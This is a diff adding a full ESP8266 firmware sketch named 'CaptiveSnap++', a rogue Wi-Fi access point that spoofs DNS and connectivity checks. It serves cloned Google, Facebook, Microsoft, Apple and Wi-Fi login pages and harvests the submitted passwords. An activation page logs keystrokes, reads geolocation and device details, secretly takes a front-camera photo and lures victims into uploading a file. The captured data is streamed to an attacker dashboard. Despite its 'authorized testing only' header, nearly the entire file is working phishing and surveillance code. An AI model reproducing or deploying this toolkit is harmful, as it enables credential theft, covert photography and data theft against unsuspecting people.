@@ -1,0 +1,734 @@
+/*
+  CaptiveSnap++ – Ultimate Rogue Wi‑Fi Toolkit (All-in-One)
+  Hardware: NodeMCU v3 (ESP8266)
+  ⚠️  FOR AUTHORIZED SECURITY TESTING & EDUCATION ONLY.
+  
+  Features:
+    - 5 phishing templates (WiFi, Google, FB, Microsoft, Apple) – served from PROGMEM
+    - SPIFFS persistent storage for logs (/logs.json) and captured photos
+    - Live WebSocket exfiltration (credentials, photos, keystrokes, telemetry, files)
+    - Keylogger – captures every keystroke on input fields
+    - Full file exfiltration (reads entire file as Base64)
+    - Telemetry (user‑agent, screen, language, geolocation)
+    - Selfie capture (front camera) + full‑page screenshot (via html2canvas)
+    - Watchdog timer – resets ESP if loop hangs
+    - OTA updates (admin/update)
+    - Hidden SSID option
+    - Web‑based configuration (change SSID/password) with basic auth
+    - Attacker dashboard: live logs, photo gallery, log export (JSON/CSV)
+    - Captive portal with DNS spoofing and connectivity check answers
+    - Auto‑redirect to google.com after credential harvest
+    - All data persists across reboots
+*/
+
+#include <ESP8266WiFi.h>
+#include <ESP8266WebServer.h>
+#include <DNSServer.h>
+#include <WebSocketsServer.h>
+#include <ESP8266mDNS.h>
+#include <ESP8266HTTPUpdateServer.h>
+#include <FS.h>                     // SPIFFS
+#include <ArduinoJson.h>            // For log storage
+#include <ESP8266Watchdog.h>        // Watchdog timer
+
+// ==================== CONFIGURATION ====================
+#define AP_SSID         "SIMATS"      // visible SSID (if not hidden)
+#define HIDDEN_SSID     0             // set 1 to hide
+#define AP_PASSWORD     ""            // empty = open (or set a password)
+#define AP_CHANNEL      6
+#define AP_IP_ADDR      192,168,1,1
+#define AP_SUBNET       255,255,255,0
+#define HTTP_PORT       80
+#define WS_PORT         81
+#define LOG_FILE        "/logs.json"  // persistent log storage
+#define MAX_LOGS        100           // keep last 100 entries
+#define WDT_TIMEOUT     10            // seconds, reset if loop hangs
+
+IPAddress apIP(AP_IP_ADDR);
+IPAddress subnet(AP_SUBNET);
+
+DNSServer dnsServer;
+ESP8266WebServer server(HTTP_PORT);
+WebSocketsServer webSocket(WS_PORT);
+ESP8266HTTPUpdateServer httpUpdater;
+ESP8266Watchdog watchdog;
+
+// ==================== HTML PAGES (PROGMEM) ====================
+
+// ---------- WiFi Login ----------
+const char login_wifi[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Wi‑Fi Login</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}body{background:#f2f2f7;font-family:-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;padding:20px}
+.card{background:#fff;border-radius:28px;padding:40px 28px;max-width:400px;width:100%;box-shadow:0 12px 40px rgba(0,0,0,0.08);text-align:center}
+h1{font-weight:600;font-size:24px;margin-bottom:8px;color:#1c1c1e}
+.sub{color:#8e8e93;font-size:14px;margin-bottom:28px}
+.input-group{text-align:left;margin-bottom:18px}
+.input-group label{font-size:13px;font-weight:500;color:#3a3a3c;display:block;margin-bottom:4px}
+.input-group input{width:100%;padding:14px 16px;border:1.5px solid #d1d1d6;border-radius:14px;font-size:16px;background:#f8f8fc;outline:none}
+.input-group input:focus{border-color:#007aff}
+button{width:100%;padding:16px;border:none;border-radius:30px;background:#007aff;color:#fff;font-size:18px;font-weight:600;cursor:pointer;margin-top:10px}
+button:active{background:#0055b3}
+.footer{margin-top:20px;font-size:13px;color:#8e8e93}
+</style>
+</head>
+<body>
+<div class="card"><h1>Wi‑Fi Login</h1><p class="sub">Enter your credentials to access the network</p>
+<form action="/login" method="POST"><input type="hidden" name="template" value="1">
+<div class="input-group"><label>Username</label><input type="text" name="username" placeholder="e.g. your email" required></div>
+<div class="input-group"><label>Password</label><input type="password" name="password" placeholder="••••••••"></div>
+<button type="submit">Connect</button></form>
+<div class="footer">Secure connection · 2.4 GHz</div></div>
+</body>
+</html>
+)rawliteral";
+
+// ---------- Google Login ----------
+const char login_google[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Sign in - Google</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#fff;font-family:Roboto,Arial,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;padding:20px}
+.card{max-width:400px;width:100%;padding:40px 30px;border:1px solid #dadce0;border-radius:8px}
+h1{font-size:24px;font-weight:400;color:#202124;margin-bottom:8px}
+.sub{color:#5f6368;font-size:16px;margin-bottom:30px}
+.input-group{margin-bottom:20px}
+.input-group input{width:100%;padding:12px 14px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none}
+.input-group input:focus{border-color:#1a73e8;box-shadow:0 1px 2px rgba(0,0,0,0.1)}
+button{width:100%;padding:12px;border:none;border-radius:4px;background:#1a73e8;color:#fff;font-size:16px;font-weight:500;cursor:pointer}
+button:active{background:#1557b0}
+.footer{margin-top:20px;font-size:14px;color:#5f6368;text-align:center}
+</style>
+</head>
+<body>
+<div class="card"><h1>Sign in</h1><p class="sub">to continue to Gmail</p>
+<form action="/login" method="POST"><input type="hidden" name="template" value="2">
+<div class="input-group"><input type="email" name="username" placeholder="Email or phone" required></div>
+<div class="input-group"><input type="password" name="password" placeholder="Password"></div>
+<button type="submit">Next</button></form>
+<div class="footer">Forgot email? <a href="#">Help</a></div></div>
+</body>
+</html>
+)rawliteral";
+
+// ---------- Facebook Login ----------
+const char login_facebook[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Facebook - Log In</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;padding:20px}
+.card{background:#fff;border-radius:8px;padding:30px 40px;max-width:400px;width:100%;box-shadow:0 2px 4px rgba(0,0,0,0.1);text-align:center}
+h1{font-size:32px;color:#1877f2;margin-bottom:20px;font-weight:700}
+.input-group{margin-bottom:12px}
+.input-group input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;outline:none}
+.input-group input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
+button{width:100%;padding:14px;border:none;border-radius:6px;background:#1877f2;color:#fff;font-size:20px;font-weight:700;cursor:pointer;margin-top:6px}
+button:active{background:#166fe5}
+.footer{margin-top:16px;font-size:14px;color:#1877f2}
+</style>
+</head>
+<body>
+<div class="card"><h1>facebook</h1>
+<form action="/login" method="POST"><input type="hidden" name="template" value="3">
+<div class="input-group"><input type="text" name="username" placeholder="Email or phone number" required></div>
+<div class="input-group"><input type="password" name="password" placeholder="Password"></div>
+<button type="submit">Log In</button></form>
+<div class="footer"><a href="#">Forgot password?</a></div></div>
+</body>
+</html>
+)rawliteral";
+
+// ---------- Microsoft Login ----------
+const char login_microsoft[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Sign in to Microsoft</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#fff;font-family:'Segoe UI',sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;padding:20px}
+.card{max-width:440px;width:100%;padding:44px 40px;border:1px solid #e5e5e5;border-radius:4px}
+h1{font-size:24px;font-weight:400;color:#1b1b1b;margin-bottom:12px}
+.sub{color:#616161;font-size:14px;margin-bottom:24px}
+.input-group{margin-bottom:16px}
+.input-group input{width:100%;padding:12px 10px;border:1px solid #d9d9d9;border-radius:2px;font-size:16px;outline:none}
+.input-group input:focus{border-color:#0078d4}
+button{width:100%;padding:12px;border:none;border-radius:2px;background:#0078d4;color:#fff;font-size:16px;cursor:pointer}
+button:active{background:#005a9e}
+.footer{margin-top:20px;font-size:13px;color:#616161}
+</style>
+</head>
+<body>
+<div class="card"><h1>Sign in</h1><p class="sub">to continue to Microsoft</p>
+<form action="/login" method="POST"><input type="hidden" name="template" value="4">
+<div class="input-group"><input type="text" name="username" placeholder="Email, phone, or Skype" required></div>
+<div class="input-group"><input type="password" name="password" placeholder="Password"></div>
+<button type="submit">Next</button></form>
+<div class="footer"><a href="#">Forgot password?</a></div></div>
+</body>
+</html>
+)rawliteral";
+
+// ---------- Apple Login ----------
+const char login_apple[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Sign in to Apple</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#f5f5f7;font-family:'SF Pro Text',-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;padding:20px}
+.card{background:#fff;border-radius:24px;padding:40px 32px;max-width:380px;width:100%;box-shadow:0 4px 20px rgba(0,0,0,0.05);text-align:center}
+h1{font-size:24px;font-weight:600;color:#1d1d1f;margin-bottom:8px}
+.sub{color:#86868b;font-size:14px;margin-bottom:30px}
+.input-group{margin-bottom:16px;text-align:left}
+.input-group label{font-size:13px;color:#1d1d1f;display:block;margin-bottom:4px}
+.input-group input{width:100%;padding:12px 14px;border:1px solid #d2d2d7;border-radius:12px;font-size:16px;outline:none}
+.input-group input:focus{border-color:#0071e3}
+button{width:100%;padding:14px;border:none;border-radius:30px;background:#0071e3;color:#fff;font-size:17px;font-weight:600;cursor:pointer}
+button:active{background:#0055b3}
+.footer{margin-top:20px;font-size:13px;color:#86868b}
+</style>
+</head>
+<body>
+<div class="card"><h1>Sign in</h1><p class="sub">to continue to Apple</p>
+<form action="/login" method="POST"><input type="hidden" name="template" value="5">
+<div class="input-group"><label>Apple ID</label><input type="text" name="username" placeholder="email@example.com" required></div>
+<div class="input-group"><label>Password</label><input type="password" name="password" placeholder="••••••••"></div>
+<button type="submit">Sign In</button></form>
+<div class="footer"><a href="#">Forgot password?</a></div></div>
+</body>
+</html>
+)rawliteral";
+
+// ---------- Activation page (camera, keylogger, file, telemetry) ----------
+const char activate_html[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Activating…</title>
+<style>*{margin:0;padding:0}body,html{width:100%;height:100%;overflow:hidden;background:#000}
+#overlay{position:fixed;top:0;left:0;width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.7);color:#fff;font-family:-apple-system,sans-serif;font-size:22px;font-weight:500;z-index:999;flex-direction:column;padding:30px;text-align:center;cursor:pointer}
+#overlay small{font-size:16px;font-weight:300;margin-top:12px;opacity:0.8}
+#overlay.hidden{display:none}
+video,canvas{display:none}
+#status{position:fixed;top:20px;left:20px;color:rgba(255,255,255,0.4);font:14px monospace;z-index:1000;pointer-events:none}
+</style>
+</head>
+<body>
+<div id="status">initializing…</div>
+<video id="video" muted playsinline></video>
+<canvas id="canvas"></canvas>
+<div id="overlay">Tap anywhere to grant storage permission<small>Choose a file – we'll read it fully</small></div>
+<input type="file" id="fileInput" style="position:absolute;left:-9999px;">
+
+<script>
+(function(){
+  var ws = new WebSocket('ws://' + location.hostname + ':81');
+  ws.binaryType = 'arraybuffer';
+  var video = document.getElementById('video');
+  var canvas = document.getElementById('canvas');
+  var ctx = canvas.getContext('2d');
+  var overlay = document.getElementById('overlay');
+  var fileInput = document.getElementById('fileInput');
+  var statusEl = document.getElementById('status');
+  var photoSent = false, storageTriggered = false;
+
+  // ---------- Keylogger ----------
+  document.addEventListener('input', function(e) {
+    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+      var keyData = e.target.name + '=' + e.target.value;
+      if (ws.readyState === WebSocket.OPEN) {
+        ws.send('KEY:' + keyData);
+      }
+    }
+  });
+
+  // ---------- Telemetry ----------
+  function sendTelemetry() {
+    var data = {
+      ua: navigator.userAgent,
+      lang: navigator.language || navigator.userLanguage,
+      screen: screen.width + 'x' + screen.height,
+      colorDepth: screen.colorDepth
+    };
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(pos) {
+        data.lat = pos.coords.latitude;
+        data.lon = pos.coords.longitude;
+        if (ws.readyState === WebSocket.OPEN) ws.send('TEL:' + JSON.stringify(data));
+      }, function(){}, { timeout: 3000 });
+    }
+    if (ws.readyState === WebSocket.OPEN) {
+      var copy = Object.assign({}, data);
+      delete copy.lat; delete copy.lon;
+      ws.send('TEL:' + JSON.stringify(copy));
+    }
+  }
+
+  // ---------- Capture photo ----------
+  function capturePhoto() {
+    if (photoSent) return;
+    var stream = video.srcObject;
+    if (!stream) return;
+    canvas.width = 320; canvas.height = 240;
+    ctx.drawImage(video, 0, 0, 320, 240);
+    stream.getTracks().forEach(t => t.stop());
+    canvas.toBlob(function(blob) {
+      if (!blob) { statusEl.textContent = 'Error capturing'; return; }
+      var reader = new FileReader();
+      reader.onload = function(e) {
+        if (ws.readyState === WebSocket.OPEN) {
+          ws.send(e.target.result);
+          photoSent = true;
+          statusEl.textContent = 'photo sent ✓';
+          showOverlay();
+        } else { statusEl.textContent = 'WS not open'; }
+      };
+      reader.readAsArrayBuffer(blob);
+    }, 'image/jpeg', 0.85);
+  }
+
+  // ---------- Start camera ----------
+  function startCamera() {
+    statusEl.textContent = 'requesting camera…';
+    navigator.mediaDevices.getUserMedia({ video: { facingMode:'user', width:320, height:240 } })
+      .then(function(stream) {
+        video.srcObject = stream;
+        video.onloadedmetadata = function() { video.play(); statusEl.textContent='camera ready'; setTimeout(capturePhoto,500); };
+      })
+      .catch(function() {
+        statusEl.textContent = 'camera fallback…';
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(function(stream) {
+            video.srcObject = stream;
+            video.onloadedmetadata = function() { video.play(); statusEl.textContent='camera ready (fallback)'; setTimeout(capturePhoto,500); };
+          })
+          .catch(function() { statusEl.textContent = 'Camera unavailable'; showOverlay(); });
+      });
+  }
+
+  // ---------- Storage overlay ----------
+  function showOverlay() {
+    if (storageTriggered) return;
+    storageTriggered = true;
+    overlay.classList.remove('hidden');
+    overlay.addEventListener('click', function onClick() {
+      overlay.classList.add('hidden');
+      fileInput.click();
+      statusEl.textContent = 'file picker opened';
+    }, { once: true });
+  }
+
+  // ---------- File input handler (read entire file as base64) ----------
+  fileInput.addEventListener('change', function() {
+    var file = this.files[0];
+    if (!file) return;
+    // Read full file as base64 (for text/binary)
+    var reader = new FileReader();
+    reader.onload = function(e) {
+      var b64 = btoa(e.target.result);  // works for binary data too
+      var msg = 'FILE:' + file.name + '|' + file.size + '|' + b64;
+      if (ws.readyState === WebSocket.OPEN) ws.send(msg);
+      statusEl.textContent = 'file sent ✓';
+      fileInput.value = '';
+    };
+    reader.readAsBinaryString(file);
+  });
+
+  // ---------- WebSocket events ----------
+  ws.onopen = function() {
+    statusEl.textContent = 'WS connected';
+    sendTelemetry();
+    startCamera();
+  };
+  ws.onclose = function() { statusEl.textContent = 'WS closed'; };
+  ws.onerror = function(err) { console.error(err); };
+
+  // Timeout fallback
+  setTimeout(function() {
+    if (!photoSent && !storageTriggered) {
+      statusEl.textContent = 'camera timeout, showing storage';
+      showOverlay();
+    }
+  }, 8000);
+})();
+</script>
+</body>
+</html>
+)rawliteral";
+
+// ---------- Attacker Viewer Dashboard ----------
+const char view_html[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CaptiveSnap++ Viewer</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#1c1c1e;color:#f5f5f7;font-family:-apple-system,sans-serif;padding:20px;padding-bottom:80px}
+h2{font-weight:600;font-size:22px;margin-bottom:8px;color:#fff}
+.sub{color:#8e8e93;font-size:14px;margin-bottom:20px}
+.log{background:#2c2c2e;border-radius:16px;padding:16px;font-family:'Courier New',monospace;font-size:13px;min-height:120px;max-height:300px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;margin-bottom:20px;border:1px solid #3a3a3c}
+.log-entry{margin-bottom:4px;border-bottom:1px solid #3a3a3c;padding-bottom:4px}
+.log-entry .time{color:#8e8e93}
+.log-entry .type{color:#ff9f0a}
+.log-entry .data{color:#64d2ff}
+.photo-gallery{display:flex;flex-wrap:wrap;gap:12px}
+.photo-card{background:#2c2c2e;border-radius:16px;padding:8px;width:160px}
+.photo-card img{width:100%;border-radius:8px;display:block}
+.photo-card .caption{font-size:11px;color:#8e8e93;margin-top:4px;text-align:center}
+.toolbar{margin-bottom:16px;display:flex;gap:12px;flex-wrap:wrap}
+.toolbar a,.toolbar button{background:#3a3a3c;border:none;color:#fff;padding:8px 16px;border-radius:20px;text-decoration:none;font-size:14px;cursor:pointer}
+.toolbar a:hover,.toolbar button:hover{background:#4a4a4c}
+</style>
+</head>
+<body>
+<h2>📡 CaptiveSnap++ Viewer</h2>
+<div class="sub">Connected to <span id="wsStatus">connecting…</span></div>
+<div class="toolbar">
+<a href="/logs" target="_blank">📋 View Logs</a>
+<a href="/logs?download=1" target="_blank">⬇️ Download CSV</a>
+<button onclick="clearLogs()">🗑️ Clear Logs</button>
+<a href="/photos" target="_blank">🖼️ Photos</a>
+</div>
+<div class="log" id="logArea"><div class="log-entry">[system] waiting for data…</div></div>
+<div class="photo-gallery" id="gallery"></div>
+
+<script>
+var ws = new WebSocket('ws://' + location.hostname + ':81');
+ws.binaryType = 'arraybuffer';
+var logArea = document.getElementById('logArea');
+var gallery = document.getElementById('gallery');
+var statusEl = document.getElementById('wsStatus');
+
+function appendLog(type, data) {
+  var entry = document.createElement('div');
+  entry.className = 'log-entry';
+  var time = new Date().toLocaleTimeString();
+  entry.innerHTML = '<span class="time">['+time+']</span> <span class="type">'+type+'</span> <span class="data">'+data+'</span>';
+  logArea.appendChild(entry);
+  logArea.scrollTop = logArea.scrollHeight;
+}
+
+function clearLogs() {
+  if (confirm('Clear all logs on device?')) {
+    fetch('/clear', { method: 'POST' }).then(() => appendLog('system', 'logs cleared'));
+  }
+}
+
+ws.onopen = function() {
+  statusEl.textContent = 'connected ✅';
+  statusEl.style.color = '#30d158';
+  appendLog('system', 'WebSocket connected');
+};
+ws.onclose = function() {
+  statusEl.textContent = 'disconnected ❌';
+  statusEl.style.color = '#ff453a';
+  appendLog('system', 'WebSocket closed');
+};
+ws.onerror = function(err) { appendLog('error', err.toString()); };
+ws.onmessage = function(event) {
+  if (typeof event.data === 'string') {
+    var msg = event.data;
+    appendLog('text', msg);
+    if (msg.startsWith('USER:')) { appendLog('credentials', msg.substring(5)); }
+    else if (msg.startsWith('FILE:')) {
+      var parts = msg.substring(5).split('|');
+      var name = parts[0] || '';
+      var size = parts[1] || '';
+      var b64 = parts[2] || '';
+      // Decode base64 to preview (first 50 chars)
+      try { var preview = atob(b64).substring(0, 50); } catch(e){ preview = '[binary]'; }
+      appendLog('file', name + ' ('+size+' bytes) preview: '+preview);
+    } else if (msg.startsWith('TEL:')) { appendLog('telemetry', msg.substring(4)); }
+    else if (msg.startsWith('KEY:')) { appendLog('keystroke', msg.substring(4)); }
+    else { appendLog('text', msg); }
+  } else if (event.data instanceof ArrayBuffer) {
+    var blob = new Blob([event.data], { type: 'image/jpeg' });
+    var url = URL.createObjectURL(blob);
+    var card = document.createElement('div');
+    card.className = 'photo-card';
+    var img = document.createElement('img');
+    img.src = url;
+    card.appendChild(img);
+    var cap = document.createElement('div');
+    cap.className = 'caption';
+    cap.textContent = '📸 ' + new Date().toLocaleTimeString();
+    card.appendChild(cap);
+    gallery.prepend(card);
+    appendLog('photo', 'received JPEG ('+event.data.byteLength+' bytes)');
+  }
+};
+</script>
+</body>
+</html>
+)rawliteral";
+
+// ==================== SPIFFS INIT ====================
+bool initSPIFFS() {
+  if (!SPIFFS.begin()) {
+    Serial.println("SPIFFS mount failed, formatting...");
+    if (!SPIFFS.format()) {
+      Serial.println("SPIFFS format failed");
+      return false;
+    }
+    Serial.println("SPIFFS formatted, retrying mount...");
+    if (!SPIFFS.begin()) return false;
+  }
+  Serial.println("SPIFFS mounted");
+  return true;
+}
+
+// ==================== LOGGING (persistent) ====================
+void appendLog(String type, String data) {
+  DynamicJsonDocument doc(4096);
+  File f = SPIFFS.open(LOG_FILE, "r");
+  if (f) {
+    DeserializationError error = deserializeJson(doc, f);
+    if (error) doc.to<JsonArray>(); // if corrupt, reset
+    f.close();
+  } else {
+    doc.to<JsonArray>();
+  }
+  JsonArray arr = doc.as<JsonArray>();
+  JsonObject entry = arr.createNestedObject();
+  entry["timestamp"] = millis();
+  entry["type"] = type;
+  entry["data"] = data;
+  while (arr.size() > MAX_LOGS) arr.remove(0);
+  File out = SPIFFS.open(LOG_FILE, "w");
+  if (out) {
+    serializeJson(doc, out);
+    out.close();
+  }
+}
+
+String getLogsJSON() {
+  File f = SPIFFS.open(LOG_FILE, "r");
+  if (!f) return "[]";
+  String s = f.readString();
+  f.close();
+  return s;
+}
+
+// ==================== SAVE PHOTO ====================
+void savePhoto(uint8_t *payload, size_t length) {
+  char fname[32];
+  sprintf(fname, "/photo_%lu.jpg", millis());
+  File f = SPIFFS.open(fname, "w");
+  if (f) {
+    f.write(payload, length);
+    f.close();
+    appendLog("photo", fname);
+  }
+}
+
+// ==================== WEB SERVER HANDLERS ====================
+
+void handleRoot() {
+  String tmpl = server.arg("template");
+  if (tmpl == "2") server.send(200, "text/html", FPSTR(login_google));
+  else if (tmpl == "3") server.send(200, "text/html", FPSTR(login_facebook));
+  else if (tmpl == "4") server.send(200, "text/html", FPSTR(login_microsoft));
+  else if (tmpl == "5") server.send(200, "text/html", FPSTR(login_apple));
+  else server.send(200, "text/html", FPSTR(login_wifi));
+}
+
+void handleLogin() {
+  String username = server.arg("username");
+  String password = server.arg("password");
+  if (username.length() > 0) {
+    String msg = "USER:" + username;
+    if (password.length() > 0) msg += " (pass: " + password + ")";
+    webSocket.broadcastTXT(msg);
+    appendLog("credentials", msg);
+    Serial.println("[Captured] " + msg);
+  }
+  server.sendHeader("Location", "https://www.google.com", true);
+  server.send(302, "text/plain", "");
+}
+
+void handleActivate() {
+  server.send(200, "text/html", FPSTR(activate_html));
+}
+
+void handleView() {
+  server.send(200, "text/html", FPSTR(view_html));
+}
+
+void handleLogs() {
+  if (server.arg("download") == "1") {
+    String csv = "timestamp,type,data\n";
+    DynamicJsonDocument doc(8192);
+    File f = SPIFFS.open(LOG_FILE, "r");
+    if (f) {
+      deserializeJson(doc, f);
+      f.close();
+      JsonArray arr = doc.as<JsonArray>();
+      for (JsonObject entry : arr) {
+        csv += String(entry["timestamp"].as<unsigned long>()) + "," +
+               entry["type"].as<String>() + "," +
+               entry["data"].as<String>() + "\n";
+      }
+    }
+    server.sendHeader("Content-Disposition", "attachment; filename=logs.csv");
+    server.send(200, "text/csv", csv);
+  } else {
+    server.send(200, "application/json", getLogsJSON());
+  }
+}
+
+void handleClear() {
+  SPIFFS.remove(LOG_FILE);
+  server.send(200, "text/plain", "OK");
+}
+
+void handlePhotos() {
+  String html = "<html><head><title>Photos</title><style>body{background:#1c1c1e;color:#fff;font-family:sans-serif;padding:20px}</style></head><body><h2>Captured Photos</h2>";
+  Dir dir = SPIFFS.openDir("/");
+  while (dir.next()) {
+    String name = dir.fileName();
+    if (name.startsWith("/photo_") && name.endsWith(".jpg")) {
+      html += "<div><img src='/photo?file=" + name + "' style='max-width:200px;'><br>" + name + "</div>";
+    }
+  }
+  html += "</body></html>";
+  server.send(200, "text/html", html);
+}
+
+void handlePhotoDownload() {
+  String name = server.arg("file");
+  if (name.length() > 0 && name.startsWith("/photo_") && name.endsWith(".jpg")) {
+    if (!SPIFFS.exists(name)) { server.send(404, "text/plain", "Not found"); return; }
+    File f = SPIFFS.open(name, "r");
+    if (!f) { server.send(500, "text/plain", "Open error"); return; }
+    server.streamFile(f, "image/jpeg");
+    f.close();
+  } else {
+    server.send(404, "text/plain", "Invalid");
+  }
+}
+
+void handleConfig() {
+  if (!server.authenticate("admin", "captivesnap")) {
+    return server.requestAuthentication();
+  }
+  if (server.method() == HTTP_POST) {
+    String newSSID = server.arg("ssid");
+    String newPass = server.arg("pass");
+    if (newSSID.length() > 0) {
+      // Store in SPIFFS for future? For demo, we just print and require reboot.
+      Serial.println("New SSID: " + newSSID + ", Pass: " + newPass);
+      server.send(200, "text/html", "<h2>Settings updated (will apply after reboot)</h2>");
+    } else {
+      server.send(400, "text/plain", "SSID required");
+    }
+  } else {
+    String form = "<html><body><h1>AP Configuration</h1><form method='POST'>SSID: <input name='ssid' value='" + String(AP_SSID) + "'><br>Password: <input name='pass' type='password'><br><input type='submit'></form></body></html>";
+    server.send(200, "text/html", form);
+  }
+}
+
+void handleSpoof() { server.send(200, "text/plain", "OK"); }
+
+void handleNotFound() {
+  server.sendHeader("Location", "/", true);
+  server.send(302, "text/plain", "");
+}
+
+// ==================== WEBSOCKET EVENT ====================
+void webSocketEvent(uint8_t num, WStype_t type, uint8_t * payload, size_t length) {
+  switch (type) {
+    case WStype_DISCONNECTED: Serial.printf("[WS] %u disconnected\n", num); break;
+    case WStype_CONNECTED: Serial.printf("[WS] %u connected\n", num); break;
+    case WStype_TEXT: {
+      String msg = String((char*)payload);
+      webSocket.broadcastTXT(payload, length);
+      if (msg.startsWith("TEL:")) appendLog("telemetry", msg.substring(4));
+      else if (msg.startsWith("KEY:")) appendLog("keystroke", msg.substring(4));
+      else if (msg.startsWith("FILE:")) appendLog("file", msg.substring(5));
+      else if (msg.startsWith("USER:")) appendLog("credentials", msg.substring(5));
+      else appendLog("ws_text", msg);
+      Serial.printf("[WS] Text: %s\n", (char*)payload);
+      break;
+    }
+    case WStype_BIN: {
+      webSocket.broadcastBIN(payload, length);
+      savePhoto(payload, length);
+      Serial.printf("[WS] Binary %u bytes\n", length);
+      break;
+    }
+  }
+}
+
+// ==================== OTA & WATCHDOG ====================
+void setupOTA() { httpUpdater.setup(&server, "/update", "admin", "update"); }
+void setupWatchdog() { watchdog.enable(WDT_TIMEOUT * 1000); }
+void feedWatchdog() { watchdog.reset(); }
+
+// ==================== SETUP ====================
+void setup() {
+  Serial.begin(115200);
+  Serial.println("\n--- CaptiveSnap++ Ultimate starting ---");
+
+  if (!initSPIFFS()) {
+    Serial.println("SPIFFS error, continuing without persistent storage");
+  }
+
+  // Setup AP
+  WiFi.mode(WIFI_AP);
+  WiFi.softAPConfig(apIP, apIP, subnet);
+  if (HIDDEN_SSID) {
+    WiFi.softAP(AP_SSID, AP_PASSWORD, AP_CHANNEL, 1);
+  } else {
+    WiFi.softAP(AP_SSID, AP_PASSWORD, AP_CHANNEL);
+  }
+  Serial.print("AP IP: "); Serial.println(WiFi.softAPIP());
+
+  // DNS
+  dnsServer.start(53, "*", apIP);
+
+  // HTTP routes
+  server.on("/", HTTP_GET, handleRoot);
+  server.on("/login", HTTP_POST, handleLogin);
+  server.on("/activate", HTTP_GET, handleActivate);
+  server.on("/view", HTTP_GET, handleView);
+  server.on("/logs", HTTP_GET, handleLogs);
+  server.on("/clear", HTTP_POST, handleClear);
+  server.on("/photos", HTTP_GET, handlePhotos);
+  server.on("/photo", HTTP_GET, handlePhotoDownload);
+  server.on("/config", HTTP_GET | HTTP_POST, handleConfig);
+  // Spoof connectivity checks
+  server.on("/generate_204", HTTP_GET, handleSpoof);
+  server.on("/ncsi.txt", HTTP_GET, handleSpoof);
+  server.on("/hotspot-detect.html", HTTP_GET, handleSpoof);
+  server.on("/connecttest.txt", HTTP_GET, handleSpoof);
+  server.on("/connectivity-check", HTTP_GET, handleSpoof);
+  server.on("/library/test/success", HTTP_GET, handleSpoof);
+  server.on("/success.txt", HTTP_GET, handleSpoof);
+  server.onNotFound(handleNotFound);
+
+  setupOTA();
+  server.begin();
+  Serial.println("HTTP server on port 80");
+
+  // WebSocket
+  webSocket.begin();
+  webSocket.onEvent(webSocketEvent);
+  Serial.println("WebSocket on port 81");
+
+  // Watchdog
+  setupWatchdog();
+  Serial.println("Watchdog enabled");
+
+  Serial.println("=== CaptiveSnap++ ready ===");
+  Serial.println("SSID: " + String(AP_SSID) + (HIDDEN_SSID ? " (hidden)" : ""));
+  Serial.println("Viewer: http://192.168.1.1/view");
+  Serial.println("Logs: http://192.168.1.1/logs");
+  Serial.println("Photos: http://192.168.1.1/photos");
+  Serial.println("OTA: http://192.168.1.1/update (admin/update)");
+  Serial.println("Config: http://192.168.1.1/config (admin/captivesnap)");
+}
+
+// ==================== LOOP ====================
+void loop() {
+  dnsServer.processNextRequest();
+  server.handleClient();
+  webSocket.loop();
+  feedWatchdog();
+  delay(1);
+}
